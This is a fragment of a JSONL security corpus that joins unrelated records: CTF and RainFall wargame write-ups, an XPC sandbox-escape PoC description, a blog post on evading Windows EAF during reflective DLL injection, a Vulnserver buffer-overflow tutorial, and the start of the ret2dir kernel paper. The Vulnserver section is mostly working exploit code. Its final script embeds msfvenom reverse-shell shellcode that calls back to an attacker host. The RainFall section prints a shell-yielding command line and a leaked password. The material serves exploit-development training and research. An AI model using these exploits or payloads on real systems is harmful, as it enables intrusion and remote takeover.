hxp{k3eP_C4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nfind hxp{k3eP_C4lAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nfind hxp{k3eP_C4lMAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nfind hxp{k3eP_C4lM_AAAAAAAAAAAAAAAAAAAAAAAAAAAA\nfind hxp{k3eP_C4lM_AAAAAAAAAAAAAAAAAAAAAAAAAAAA\nfind hxp{k3eP_C4lM_AnAAAAAAAAAAAAAAAAAAAAAAAAAA\nfind hxp{k3eP_C4lM_AnDAAAAAAAAAAAAAAAAAAAAAAAAA\nfind hxp{k3eP_C4lM_AnD_AAAAAAAAAAAAAAAAAAAAAAAA\nfind hxp{k3eP_C4lM_AnD_DAAAAAAAAAAAAAAAAAAAAAAA\nfind hxp{k3eP_C4lM_AnD_D0AAAAAAAAAAAAAAAAAAAAAA\nfind hxp{k3eP_C4lM_AnD_D0nAAAAAAAAAAAAAAAAAAAAA\nfind hxp{k3eP_C4lM_AnD_D0n'AAAAAAAAAAAAAAAAAAAA\nfind hxp{k3eP_C4lM_AnD_D0n'tAAAAAAAAAAAAAAAAAAA\nfind hxp{k3eP_C4lM_AnD_D0n't_AAAAAAAAAAAAAAAAAA\nfind hxp{k3eP_C4lM_AnD_D0n't_PAAAAAAAAAAAAAAAAA\nfind hxp{k3eP_C4lM_AnD_D0n't_P4AAAAAAAAAAAAAAAA\nfind hxp{k3eP_C4lM_AnD_D0n't_P4nAAAAAAAAAAAAAAA\nfind hxp{k3eP_C4lM_AnD_D0n't_P4n1AAAAAAAAAAAAAA\nfind hxp{k3eP_C4lM_AnD_D0n't_P4n1cAAAAAAAAAAAAA\nfind hxp{k3eP_C4lM_AnD_D0n't_P4n1c_AAAAAAAAAAAA\nfind hxp{k3eP_C4lM_AnD_D0n't_P4n1c__AAAAAAAAAAA\nfind hxp{k3eP_C4lM_AnD_D0n't_P4n1c__GAAAAAAAAAA\nfind hxp{k3eP_C4lM_AnD_D0n't_P4n1c__G0AAAAAAAAA\nfind hxp{k3eP_C4lM_AnD_D0n't_P4n1c__G0_AAAAAAAA\nfind hxp{k3eP_C4lM_AnD_D0n't_P4n1c__G0_iAAAAAAA\nfind hxp{k3eP_C4lM_AnD_D0n't_P4n1c__G0_i5AAAAAA\nfind hxp{k3eP_C4lM_AnD_D0n't_P4n1c__G0_i5_AAAAA\nfind hxp{k3eP_C4lM_AnD_D0n't_P4n1c__G0_i5_SAAAA\nfind hxp{k3eP_C4lM_AnD_D0n't_P4n1c__G0_i5_S4AAA\nfind hxp{k3eP_C4lM_AnD_D0n't_P4n1c__G0_i5_S4FAA\nfind hxp{k3eP_C4lM_AnD_D0n't_P4n1c__G0_i5_S4F3A\nfind hxp{k3eP_C4lM_AnD_D0n't_P4n1c__G0_i5_S4F3}\nhxp{k3eP_C4lM_AnD_D0n't_P4n1c__G0_i5_S4F3}\n[*] Stopped process '\/usr\/bin\/gdb' (pid 4985)\n```\n\n\n\n**revenge_of_the_zwiebel**\n\n- Flag : `hxp{1_5m3ll_l4zyn355}`\n- Anti-debug detection -> binary patch or dynamically set return value\n- There are so many Encrypted code chunk -> Need to Decrypt it\n- Need to make some automation script\n- Figure out flag's index and bit\n"}
{"text":"# Level bonus 1\n\n## Vulnerability\n\nmemcpy() buffer overflow\n\n## Context\n\nWe find a binary with owner ```bonus2``` and SUID.\n```\nbonus1@RainFall:~$ ls -l\n-rwsr-s---+ 1 bonus2 users 5043 Mar  6  2016 bonus1\n```\nWhen run with no arguments it segfaults. with any number of random arguments it does nothing.\n```\nbonus1@RainFall:~$ .\/bonus1\nSegmentation fault (core dumped)\nbonus1@RainFall:~$ .\/bonus1 hi\nbonus1@RainFall:~$\n```\n\n## Solution\n\nInvestigating with gdb we find only ```main()```, no other functions. ```main()``` calls ```memcpy()``` which is vulnerable to buffer overflow.\n\nFirst ```main()``` reads the first argument ```n = atoi(argv[1])```, and exits the program if ```n``` not less than 10. So any number less than 10, easy!\n\nNext ```memcpy()``` copies ```n``` * 4 bytes from ```argv[2]``` to a buffer on the stack with the potential to overflow ```n```.\n\nFinally, if now ```n``` == 0x574f4c46 (\"FLOW\" in ascii) a shell is opened.\n\nSo we want to use ```memcpy()``` to overflow ```n``` with 0x574f4c46. The problem is ```n``` <= 9, ```memcpy()``` copies ```n``` * 4 bytes, 9 * 4 = 36. Not long enough to reach and overwrite ```n```, 44 bytes minimum. The solution is to use a negative number which when multiplied by 4 is at least 44 (n * 4 => 44).\n\n### Find n (first argument)\n\nWe can write a simple c program ```find_n.c``` to find an ```n``` which works for us.\n```\n\/*\n\tfind_n.c\n*\/\n#include <stdio.h>\n#include <limits.h>\n\nint\tmain(void)\n{\n\tint\tn;\n\n\tn = INT_MIN;\n\twhile (n < 0)\n\t{\n\t\tif (n * 4 >= 44)\n\t\t{\n\t\t\tprintf(\"n = %d, n * 4 = %d\\n\", n, n * 4);\n\t\t\tbreak ;\n\t\t}\n\t\tn++;\n\t}\n\treturn (0);\n}\n```\nCompiled and run with ```gcc find_n.c -o find_n; .\/find_n``` it outputs:\n```\nn = -2147483637, n * 4 = 44\n```\n\n### Build overflow string\n\nSo our first argument ```n``` is ```-2147483637```\n\nAnd our second argument:\n1. 40 bytes padding to reach the address of ```n``` - ```$(python -c 'print \"A\" * 40'```\n2. target value ```n``` to open shell, 0x574f4c46 = \"FLOW\" in ascii - ```\"FLOW\"```\n```\nbonus1@RainFall:~$ .\/bonus1 -2147483637 $(python -c 'print \"A\" * 40 + \"FLOW\"')\n$ whoami\nbonus2\n$ cat \/home\/user\/bonus2\/.pass\n579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245\n```\n\n## Recreate Exploited Binary\n\nAs user ```bonus2```, in ```\/tmp```, create and compile ```bonus1_source.c```\n```\nbonus2@RainFall:\/tmp$ gcc bonus1_source.c -fno-stack-protector -o bonus1_source\n```\n\nEdit permissions including suid, then move the binary to home directory.\n```\nbonus2@RainFall:\/tmp$ chmod u+s bonus1_source; chmod +wx ~; mv bonus1_source ~\n```\n\nExit back to user ```bonus1```, then provide our exploit arguments to the source.\n```\nbonus2@RainFall:\/tmp$ exit\nexit\nbonus1@RainFall:~$ \/home\/user\/bonus2\/bonus1_source -2147483637 $(python -c 'print \"A\" * 40 + \"FLOW\"')\n$ whoami\nbonus2\n```\n"}
{"text":"\/\/ianbeer\nMany iOS\/MacOS sandbox escapes\/privescs due to unexpected shared memory-backed xpc_data objects\n\nWhen XPC serializes large xpc_data objects it creates mach memory entry ports\nto represent the memory region then transfers that region to the receiving process\nby sending a send right to the memory entry port in the underlying mach message.\n\nBy crafting our own xpc message (or using an interposition library as this poc does)\nwe can pass different flags to mach_make_memory_entry_64 such that the memory entry\nreceived by the target process actually represents a region of shared memory such that\nwhen the xpc_data deserialization code maps the memory entry port the memory region remains\nmapped in the sender's address space and the sender can still modify it (with the receiver\nseeing the updates.)\n\nPerhaps this is intended behaviour but there's definitely plenty of code which doesn't expect\nthe contents of xpc_data objects to change.\n\nIn this PoC I target NSXPC, a high-level RPC mechanism which uses XPC for its low-level transport layer.\nNSXPC is widely used across privilege boundaries.\n\nNSXPCDecoder is implemented in Foundation. Clients send serialized NSInvocation objects\nrepresenting the methods they wish to call on the remote objects. These NSInvocations are serialized\nusing the NSSecureCoding method which ends up creating a bplist16 serialized byte stream.\n\nThat bplist16 buffer gets sent in an xpc message as an xpc_data object.\n\nNSXPCDecoder wraps the bplist16 deserialization and for selectors such as decodeCStringForKey:\n,if the key is present, the value returned will be a pointer directly into the\nxpc_data object in which it was received.\n\nBy crafting our own memory entry object this means the pointers returned by decodeCStringForKey:\nactually point into shared memory which can still be modified by the caller.\n\nThis can be turned directly into controlled memory corruption by targetting the serialized method\ntype signature (key 'ty') which is parsed by [NSMethodSignature signatureWithObjCTypes].\n\nThis method is implemented in CoreFoundation. If the method signature string isn't in a cache of\nparsed signatures then the string is passed to __NSMS1. This function calls __NSGetSizeAndAlignment\nto determine the size of a buffer required to parse the signature string which __NSMS1 then allocates\nusing calloc before parsing the signature string into the allocated buffer. If we change the\ntypes represented by the signature string (which is in shared memory) between these two calls\nwe can cause the parsing code to write out of bounds as it assumes that the length computed by\n__NSGetSizeAndAlignment is correct.\n\nThe most direct path to trigger memory controlled memory corruption is to use a type signature like this:\n  @\"ABCD\"\n\nThat will cause 7 bytes of buffer space to be allocated for the parsed signature\n(which will just contain a copy of the string.)\n\nIf we increase the length of the string in shared memory eg to:\n  @\"ABCDOVERFLOW_OVERFLOW_OVERFLOW\"\n\nthen __NSMS1 will copy the extra bytes up until it encounters a '\"' character.\n\nThis PoC targets the airportd daemon which runs as root but should work for any NSXPC service.\nThis is a race condition so you may have to run the PoC multiple times (.\/run.sh) and also use\nlibgmalloc to see the corruption directly rather than its effects.\n"}
{"text":"#[1]zerosum0x0 - Atom [2]zerosum0x0 - RSS [3]zerosum0x0 - Atom\n[4]@zerosum0x0\nreverse engineering, penetration testing, exploit development\nSaturday, July 1, 2017\nProposed Windows 10 EAF\/EMET \"Bypass\" for Reflective DLL Injection\nWindows 10 Redstone 3 (Fall Creator's Update) is adding [5]Exploit\nGuard, bringing EMET's Export Address Table Access Filtering (EAF)\nmitigation, among others, to the system. We are still living in a\ngolden era of Windows exploitation and post-exploitation, compared to\nthe way things will be once the world moves onto Windows 10. This is a\nmitigation that will need to be bypassed sooner or later.\nEAF sets hardware breakpoints that check for legitimate access when the\nfunction exports of KERNEL32.DLL and NTDLL.DLL are read. It does this\nby checking if the offending caller code is part of a legitimately\nloaded module (which reflective DLL injection is not). EAF+ adds\nanother breakpoint for KERNELBASE.DLL. One bypass was searching a DLL\nsuch as USER32.DLL for its imports, however Windows 10 will also be\nadding the brand new Import Address Table Access Filtering (IAF).\nSo how can we avoid the EAF exploit mitigation? Simple, reflective\nDLLs, just like normal DLLs, take an LPVOID lpParam. Currently, the\nloader code does nothing with this besides forwarding it to DllMain. We\ncan allocate and pass a pointer to this struct.\n#pragma pack(1)\ntypedef struct _REFLECTIVE_LOADER_INFO\n{\nLPVOID  lpRealParam;\nLPVOID  lpDosHeader;\nFARPROC fLoadLibraryA;\nFARPROC fGetProcAddress;\nFARPROC fVirtualAlloc;\nFARPROC fNtFlushInstructionCache;\nFARPROC fVirtualLock;\n} REFLECTIVE_LOADER_INFO, *PREFLECTIVE_LOADER_INFO;\nInstead of performing two allocations, we could also shove this\ninformation in a code cave at start of the ReflectiveLoader(), or in\nthe DOS headers. I don't think DOS headers are viable for Metasploit,\nwhich [6]inserts shellcode there (that does some MSF setup and jumps to\nReflectiveLoader(), so you can start execution at offset 0), but\nperhaps in the stub between the DOS->e_lfanew field and the NT headers.\nReflective DLLs search backwards in memory for their base MZ DOS header\naddress, requiring a second function with the _ReturnAddress()\nintrinsic. We know this information and can avoid the entire process\n(note: method not possible if we shove in DOS headers).\nLikewise, the addresses for the APIs we need are also known information\nbefore the reflective loader is called. While it's true that there is\nfull ASLR for most loaded DLL modules these days, KERNEL32.DLL and\nNTDLL.DLL are only randomized upon system boot. Unless we do something\nweird, the addresses we see in the injecting process will be the same\nas in the injected process.\nIn order to get code execution to the point of being able to inject\ncode in another process, you need to be inside of a valid context or\npreviously have necessary function pointers anyways. Since EAF does not\nalert from a valid context, obtaining pointers in the first place\nshould not be an issue. From there, chaining this method with migration\nis not a problem.\nThis kind of removes some of the novelty from reflective DLL injection.\nIt's known that instead of self-loading, it's possible to perform the\nloader code from the injector (this method is seen in powerkatz.dll\n[PowerShell Empire's Mimikatz] and process hollowing). However,\nrecently there was a circumstance where I was forced to use reflective\ninjection due to the constraints I was working within. More on that at\na later time, but reflective DLL injection, even with this extra step,\nstill has plenty of uses and is highly coupled to the tools we're\ncurrently using... This is a simple fix when the issue comes up.\nPosted by [7]zerosum0x0 at [8]12:01:00\u202fAM\n[9]Email This [10]BlogThis! [11]Share to Twitter [12]Share to Facebook\n[13]Share to Pinterest\nLabels: [14]dll , [15]EAF , [16]EMET , [17]exploit , [18]exploit\nmitigation , [19]injection , [20]reflective , [21]Windows\nNo comments :\nPost a Comment\n[22]Newer Post [23]Older Post [24]Home\nSubscribe to: [25]Post Comments ( Atom )\nBlog Archive\n* [26]\u25ba  [27]2023 ( 1 )\n+ [28]\u25ba  [29]May ( 1 )\n* [30]\u25ba  [31]2020 ( 2 )\n+ [32]\u25ba  [33]August ( 1 )\n+ [34]\u25ba  [35]June ( 1 )\n* [36]\u25ba  [37]2019 ( 2 )\n+ [38]\u25ba  [39]November ( 1 )\n+ [40]\u25ba  [41]May ( 1 )\n* [42]\u25ba  [43]2018 ( 2 )\n+ [44]\u25ba  [45]November ( 1 )\n+ [46]\u25ba  [47]June ( 1 )\n* [48]\u25bc  [49]2017 ( 8 )\n+ [50]\u25ba  [51]August ( 1 )\n+ [52]\u25bc  [53]July ( 3 )\no [54]Puppet Strings - Dirty Secret for Windows Ring 0 C...\no [55]ThreadContinue - Reflective DLL Injection Using Se...\no [56]Proposed Windows 10 EAF\/EMET \"Bypass\" for Reflecti...\n+ [57]\u25ba  [58]June ( 2 )\n+ [59]\u25ba  [60]April ( 2 )\n* [61]\u25ba  [62]2016 ( 11 )\n+ [63]\u25ba  [64]November ( 3 )\n+ [65]\u25ba  [66]September ( 3 )\n+ [67]\u25ba  [68]June ( 1 )\n+ [69]\u25ba  [70]May ( 1 )\n+ [71]\u25ba  [72]February ( 3 )\n* [73]\u25ba  [74]2015 ( 26 )\n+ [75]\u25ba  [76]May ( 1 )\n+ [77]\u25ba  [78]January ( 25 )\n* [79]\u25ba  [80]2014 ( 23 )\n+ [81]\u25ba  [82]December ( 20 )\n+ [83]\u25ba  [84]November ( 2 )\n+ [85]\u25ba  [86]September ( 1 )\nTwitter [87]zerosum0x0\nGitHub  [88]zerosum0x0\npgp     [89]F19F 6101 F199 AE16\nzerosum0x0. Powered by [90]Blogger."}
{"text":"### Vulnserver.exe\n\n\n> Vulnserver is a multithreaded Windows based TCP server that listens for client connections on port 9999 (by default) and allows the user to run a number of different commands that are vulnerable to various types of exploitable buffer overflows.\n\nThe Vulnerable code is the following one:\n```c\nvoid Function1(char *Input) {\n\nchar Buffer2S[140];\n\nstrcpy(Buffer2S, Input);\n\n}\n\nvoid Function2(char *Input) {\n\nchar Buffer2S[60];\n\nstrcpy(Buffer2S, Input);\n\n}\n\nvoid Function3(char *Input) {\n\nchar Buffer2S[2000];\n\nstrcpy(Buffer2S, Input);\n\n}\n\nvoid Function4(char *Input) {\n\nchar Buffer2S[1000];\n\nstrcpy(Buffer2S, Input);\n\n}\n```\n\n### Fuzzing the Vulnserver\n\nwe write a simple Fuzzer to replicate the check unexpected crashes incrementing by 200 bytes each time with the following code:\n```python\n#!\/usr\/bin\/python\nimport socket\n\nbuffer=[\"A\"]\ncounter=100\nwhile len(buffer) <= 30:\n  buffer.append(\"A\"*counter)\n  counter=counter+200\n\nfor string in buffer:\n  print \"Fuzzing PASS with %s bytes\" % len(string)\n  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  connect=s.connect(('192.168.0.27',9999))\n  s.recv(1024)\n  s.send(('TRUN .' + string + '\\r\\n'))\n  s.recv(1024)\n  s.send('EXIT\\r\\n')\n  s.close()\n  ```\n\nwe can see the Vulnserver stop working at 2100 bytes.\n\n![Vulnserver](https:\/\/github.com\/SkyBulk\/exploit-development\/blob\/master\/images\/1.png)\n\n* Replicating the Crash *\n\nFrom our fuzzer output, we can deduce that Vulnserver has a buffer overflow vulnerability\nwhen a TRUN command with a random strings about 2100 bytes is sent to it.\n\n```python\n#!\/usr\/bin\/python\nimport socket\nimport struct\n\n\npayload = 'A' * 2100 \n\ntry:\n    print \"\\nSending tons of random bytes...\"\n    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    connect=s.connect(('192.168.0.24',9999))\n    s.recv(1024)\n    s.send(('TRUN .' + payload + '\\r\\n'))\n    s.recv(1024)\n    s.send('EXIT\\r\\n')\n    s.close()\n    print \"\\nDone! Wonder if we got that shell back?\"\nexcept:\n    print \"Could not connect to 9999 for some reason...\"\n```\n\n### Controlling EIP \n\nWe sent 2100 'A' characters and EIP was overwritten with 41414141, which is the hex code of the 'A' character. EIP was overwritten with our buffer. If we find the position of the EIP in our buffer, then we can overwrite it with any value.\n\n\n![Vulnserver_1](https:\/\/github.com\/SkyBulk\/exploit-development\/blob\/master\/images\/2.png)\n\n\nto check the exact match of our crash execute the another tool called gdb-peda with the following \n\n![Vulnserver_2](https:\/\/github.com\/SkyBulk\/exploit-development\/blob\/master\/images\/3.png)\n\n\nUpdate the PoC script the following: First send 2006 A character, then send 4 B, then C characters.\n\n```python \n#!\/usr\/bin\/python\nimport socket\nimport struct\n\npayload = 'A' * 2006 + \"B\" * 4 + \"C\" * (3500-2006-4)\n\ntry:\n    print \"\\nSending tons of random bytes...\"\n    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    connect=s.connect(('192.168.0.24',9999))\n    s.recv(1024)\n    s.send(('TRUN .' + payload + '\\r\\n'))\n    s.recv(1024)\n    s.send('EXIT\\r\\n')\n    s.close()\n    print \"\\nDone! Wonder if we got that shell back?\"\nexcept:\n    print \"Could not connect to 9999 for some reason...\"\n\n```\n\n### Check bad characters\n\nDepending on the application, vulnerability type, and protocols in use, there may be\ncertain characters that are considered \u201cbad\u201d and should not be used in your buffer,\nreturn address, or shellcode\n\nwe generate a bytearray from the immunity debugger:\n\n![Vulnserver_3](https:\/\/github.com\/SkyBulk\/exploit-development\/blob\/master\/images\/4.png)\n\nthe bytearray generated from immunity debugger we update our PoC with them to see what are our bad chars\n\n```python\n#!\/usr\/bin\/python\nimport socket\nimport struct\n\nbadchars =  \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\"\nbadchars += \"\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\"\nbadchars += \"\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"\nbadchars += \"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\"\nbadchars += \"\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\"\nbadchars += \"\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\"\nbadchars += \"\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\"\nbadchars += \"\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\"\nbadchars += \"\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\"\nbadchars += \"\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\"\nbadchars += \"\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\"\nbadchars += \"\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\"\nbadchars += \"\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\"\nbadchars += \"\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\"\nbadchars += \"\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\"\nbadchars += \"\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\"\nbadchars += \"\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\"\nbadchars += \"\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\"\nbadchars += \"\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\nbadchars += \"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\"\nbadchars += \"\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\"\nbadchars += \"\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\"\nbadchars += \"\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\"\nbadchars += \"\\xfd\\xfe\\xff\"\n\npayload = 'A' * 2006 + \"B\" * 4 + \"C\" * (3500-2006-4-len(badchars))\n\ntry:\n    print \"\\nSending tons of random bytes...\"\n    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    connect=s.connect(('192.168.0.24',9999))\n    s.recv(1024)\n    s.send(('TRUN .' + payload + '\\r\\n'))\n    s.recv(1024)\n    s.send('EXIT\\r\\n')\n    s.close()\n    print \"\\nDone! Wonder if we got that shell back?\"\nexcept:\n    print \"Could not connect to 9999 for some reason...\"\n```\n\nwe lauch our PoC and check the output\n\n![Vulnserver_4](https:\/\/github.com\/SkyBulk\/exploit-development\/blob\/master\/images\/5.png)\n\n\nwe have a badchar ```0x00``` , but I will need to check if there are any other bad char repeating the same process again.\n\nwe genarate our new bytearray , but execluding our bad char from the first output.\n\n``` !mona bytearray -cpb \"\\x00\" ```\n\nwe compare again if any byte were modified from the crash to see our badchar, and we don't have anyother badchar \n\n![Vulnserver_5](https:\/\/github.com\/SkyBulk\/exploit-development\/blob\/master\/images\/7.png)\n\n\n# Redirecting the Execution Flow\n\nIn this step we have to check the registers and the stack. We have to find a way to jump to our buffer to execute our code. ESP points to the beginning of the C part of our buffer. We have to find a JMP ESP or CALL ESP instruction. Do not forget, that the address must not contain bad characters!\n\n![Vulnserver_6](https:\/\/github.com\/SkyBulk\/exploit-development\/blob\/master\/images\/8.png)\n\n\n### Generating Shellcode with Metasploit\n\nmsfvenom -p windows\/shell_reverse_tcp LHOST=192.168.0.13 LPORT=8080 -b \"\\x00\" -f python -v shellcode \n\nPlace the generated code into the PoC script and update the buffer, so that the shellcode is placed after the EIP, in the C part. Place some NOP instructions before the shellcode. (NOP = 0x90) The final exploit:\n\n```python \n#!\/usr\/bin\/python\nimport socket\nimport struct\n\nshellcode =  \"\"\nshellcode += \"\\xb8\\xc5\\x97\\xc9\\x70\\xdb\\xc1\\xd9\\x74\\x24\\xf4\\x5b\"\nshellcode += \"\\x2b\\xc9\\xb1\\x52\\x31\\x43\\x12\\x03\\x43\\x12\\x83\\x06\"\nshellcode += \"\\x93\\x2b\\x85\\x74\\x74\\x29\\x66\\x84\\x85\\x4e\\xee\\x61\"\nshellcode += \"\\xb4\\x4e\\x94\\xe2\\xe7\\x7e\\xde\\xa6\\x0b\\xf4\\xb2\\x52\"\nshellcode += \"\\x9f\\x78\\x1b\\x55\\x28\\x36\\x7d\\x58\\xa9\\x6b\\xbd\\xfb\"\nshellcode += \"\\x29\\x76\\x92\\xdb\\x10\\xb9\\xe7\\x1a\\x54\\xa4\\x0a\\x4e\"\nshellcode += \"\\x0d\\xa2\\xb9\\x7e\\x3a\\xfe\\x01\\xf5\\x70\\xee\\x01\\xea\"\nshellcode += \"\\xc1\\x11\\x23\\xbd\\x5a\\x48\\xe3\\x3c\\x8e\\xe0\\xaa\\x26\"\nshellcode += \"\\xd3\\xcd\\x65\\xdd\\x27\\xb9\\x77\\x37\\x76\\x42\\xdb\\x76\"\nshellcode += \"\\xb6\\xb1\\x25\\xbf\\x71\\x2a\\x50\\xc9\\x81\\xd7\\x63\\x0e\"\nshellcode += \"\\xfb\\x03\\xe1\\x94\\x5b\\xc7\\x51\\x70\\x5d\\x04\\x07\\xf3\"\nshellcode += \"\\x51\\xe1\\x43\\x5b\\x76\\xf4\\x80\\xd0\\x82\\x7d\\x27\\x36\"\nshellcode += \"\\x03\\xc5\\x0c\\x92\\x4f\\x9d\\x2d\\x83\\x35\\x70\\x51\\xd3\"\nshellcode += \"\\x95\\x2d\\xf7\\x98\\x38\\x39\\x8a\\xc3\\x54\\x8e\\xa7\\xfb\"\nshellcode += \"\\xa4\\x98\\xb0\\x88\\x96\\x07\\x6b\\x06\\x9b\\xc0\\xb5\\xd1\"\nshellcode += \"\\xdc\\xfa\\x02\\x4d\\x23\\x05\\x73\\x44\\xe0\\x51\\x23\\xfe\"\nshellcode += \"\\xc1\\xd9\\xa8\\xfe\\xee\\x0f\\x7e\\xae\\x40\\xe0\\x3f\\x1e\"\nshellcode += \"\\x21\\x50\\xa8\\x74\\xae\\x8f\\xc8\\x77\\x64\\xb8\\x63\\x82\"\nshellcode += \"\\xef\\x07\\xdb\\x8c\\xe2\\xef\\x1e\\x8c\\xe3\\x7f\\x97\\x6a\"\nshellcode += \"\\x71\\x90\\xfe\\x25\\xee\\x09\\x5b\\xbd\\x8f\\xd6\\x71\\xb8\"\nshellcode += \"\\x90\\x5d\\x76\\x3d\\x5e\\x96\\xf3\\x2d\\x37\\x56\\x4e\\x0f\"\nshellcode += \"\\x9e\\x69\\x64\\x27\\x7c\\xfb\\xe3\\xb7\\x0b\\xe0\\xbb\\xe0\"\nshellcode += \"\\x5c\\xd6\\xb5\\x64\\x71\\x41\\x6c\\x9a\\x88\\x17\\x57\\x1e\"\nshellcode += \"\\x57\\xe4\\x56\\x9f\\x1a\\x50\\x7d\\x8f\\xe2\\x59\\x39\\xfb\"\nshellcode += \"\\xba\\x0f\\x97\\x55\\x7d\\xe6\\x59\\x0f\\xd7\\x55\\x30\\xc7\"\nshellcode += \"\\xae\\x95\\x83\\x91\\xae\\xf3\\x75\\x7d\\x1e\\xaa\\xc3\\x82\"\nshellcode += \"\\xaf\\x3a\\xc4\\xfb\\xcd\\xda\\x2b\\xd6\\x55\\xea\\x61\\x7a\"\nshellcode += \"\\xff\\x63\\x2c\\xef\\xbd\\xe9\\xcf\\xda\\x82\\x17\\x4c\\xee\"\nshellcode += \"\\x7a\\xec\\x4c\\x9b\\x7f\\xa8\\xca\\x70\\xf2\\xa1\\xbe\\x76\"\nshellcode += \"\\xa1\\xc2\\xea\"\n\npayload = 'A' * 2006 + struct.pack(\"<L\",0x625011AF) + '\\x90' * 16 + shellcode\n\ntry:\n    print \"\\nSending tons of random bytes...\"\n    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    connect=s.connect(('192.168.0.24',9999))\n    s.recv(1024)\n    s.send(('TRUN .' + payload + '\\r\\n'))\n    s.recv(1024)\n    s.send('EXIT\\r\\n')\n    s.close()\n    print \"\\nDone! Wonder if we got that shell back?\"\nexcept:\n    print \"Could not connect to 9999 for some reason...\"\n\n```\n\nDone! Wonder if we got that shell back?\n\n\n![Vulnserver_7](https:\/\/github.com\/SkyBulk\/exploit-development\/blob\/master\/images\/9.png)\n"}
{"text":"ret2dir: Rethinking Kernel Isolation\nVasileios P. Kemerlis Michalis Polychronakis Angelos D. Keromytis\nColumbia University\n{vpk, mikepo, angelos}@cs.columbia.edu\nAbstract\nReturn-to-user (ret2usr) attacks redirect corrupted kernel\npointers to data residing in user space. In response, sev-\neral kernel-hardening approaches have been proposed to\nenforce a more strict address space separation, by pre-\nventing arbitrary control flow transfers and dereferences\nfrom kernel to user space. Intel and ARM also recently\nintroduced hardware support for this purpose in the form\nof the SMEP, SMAP, and PXN processor features. Un-\nfortunately, although mechanisms like the above prevent\nthe explicit sharing of the virtual address space among\nuser processes and the kernel, conditions of implicit shar-\ning still exist due to fundamental design choices that\ntrade stronger isolation for performance.\nIn this work, we demonstrate how implicit page frame\nsharing can be leveraged for the complete circumven-\ntion of software and hardware kernel isolation protec-\ntions. We introduce a new kernel exploitation technique,\ncalled return-to-direct-mapped memory (ret2dir), which\nbypasses all existing ret2usr defenses, namely SMEP,\nSMAP, PXN, KERNEXEC, UDEREF, and kGuard. We\nalso discuss techniques for constructing reliable ret2dir\nexploits against x86, x86-64, AArch32, and AArch64\nLinux targets. Finally, to defend against ret2dir attacks,\nwe present the design and implementation of an exclu-\nsive page frame ownership scheme for the Linux ker-\nnel that prevents the implicit sharing of physical memory\npages with minimal runtime overhead.\n1 Introduction\nAlthough the operating system (OS) kernel has always\nbeen an appealing target, until recently attackers focused\nmostly on the exploitation of vulnerabilities in server\nand client applications\u2014which often run with adminis-\ntrative privileges\u2014as they are (for the most part) less\ncomplex to analyze and easier to compromise. During\nthe past few years, however, the kernel has become an\nequally attractive target. Continuing the increasing trend\nof the previous years, in 2013 there were 355 reported\nkernel vulnerabilities according to the National Vulnera-\nbility Database, 140 more than in 2012 [73]. Admittedly,\nthe exploitation of user-level software has become much\nharder, as recent versions of popular OSes come with nu-\nmerous protections and exploit mitigations. The princi-\nple of least privilege is better enforced in user accounts\nand system services, compilers offer more protections\nagainst common software flaws, and highly targeted ap-\nplications, such as browsers and document viewers, have\nstarted to employ sandboxing. On the other hand, the\nkernel has a huge codebase and an attack surface that\nkeeps increasing due to the constant addition of new fea-\ntures [63]. Indicatively, the size of the Linux kernel in\nterms of lines of code has more than doubled, from 6.6\nMLOC in v2.6.11 to 16.9 MLOC in v3.10 [32].\nNaturally, instead of putting significant effort to ex-\nploit applications fortified with numerous protections\nand sandboxes, attackers often turn their attention to\nthe kernel. By compromising the kernel, they can el-\nevate privileges, bypass access control and policy en-\nforcement, and escape isolation and confinement mech-\nanisms. For instance, in recent exploits against Chrome\nand Adobe Reader, after successfully gaining code ex-\necution, the attackers exploited kernel vulnerabilities to\nbreak out of the respective sandboxed processes [5,74].\nOpportunities for kernel exploitation are abundant. As\nan example consider the Linux kernel, which has been\nplagued by common software flaws, such as stack and\nheap buffer overflows [14, 23, 26], NULL pointer and\npointer arithmetic errors [10, 12], 